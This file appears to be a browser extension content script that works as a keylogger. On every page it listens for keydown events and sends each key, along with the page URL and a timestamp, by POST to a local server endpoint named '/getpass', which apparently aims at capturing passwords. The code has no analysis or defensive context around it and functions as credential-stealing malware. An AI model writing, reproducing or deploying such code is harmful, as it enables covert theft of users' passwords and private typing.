console.log('Content script loaded on:', window.location.href);

document.addEventListener('keydown', (event) => {

    const keyData = {
        key: event.key,
        url: window.location.href,
        timestamp: new Date().toISOString()
    };

    // Send the keystroke data to the server
    fetch('http://localhost:3000/getpass', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(keyData)
    });
});
